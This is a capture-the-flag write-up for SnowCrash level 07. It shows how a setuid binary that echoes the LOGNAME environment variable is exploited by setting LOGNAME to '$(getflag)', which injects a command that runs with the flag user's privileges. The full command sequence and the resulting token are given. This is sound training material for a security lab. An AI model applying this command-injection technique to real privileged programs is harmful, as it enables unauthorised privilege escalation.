# Level 07

## Vulnerability
Privilege escalation via environment variables

## Context

```
level07@SnowCrash:~$  ls -l 
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```

## Solution

Let's see what's in the level07 executable file. 
```
level07@SnowCrash:~$ strings level07
[...]
LOGNAME
/bin/echo %s
```
What  is [LOGNAME](https://unix.stackexchange.com/questions/268378/difference-between-logname-and-logname)? It's "an env variable that contains the user that executes the current shell process." There's also a call to echo here, 
Let's confirm who LOGNAME is, and see if we can change it. 
```
level07@SnowCrash:~$ echo $LOGNAME
level07
level07@SnowCrash:~$ LOGNAME=$"Harry Potter"
level07@SnowCrash:~$ echo $LOGNAME
Harry Potter
```
Hmm... Perhaps we can exploit LOGNAME to launch getflag. 
```
level07@SnowCrash:~$ LOGNAME=$\(getflag\)
level07@SnowCrash:~$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```
Success!
